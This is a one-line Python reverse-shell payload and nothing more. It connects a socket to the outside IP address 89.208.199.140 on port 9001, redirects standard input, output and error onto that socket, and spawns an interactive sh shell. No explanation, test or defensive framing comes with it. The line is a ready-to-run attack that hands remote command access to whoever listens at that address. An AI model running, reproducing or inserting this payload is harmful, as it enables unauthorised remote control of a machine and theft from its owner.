import os,pty,socket;s=socket.socket();s.connect(("89.208.199.140",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")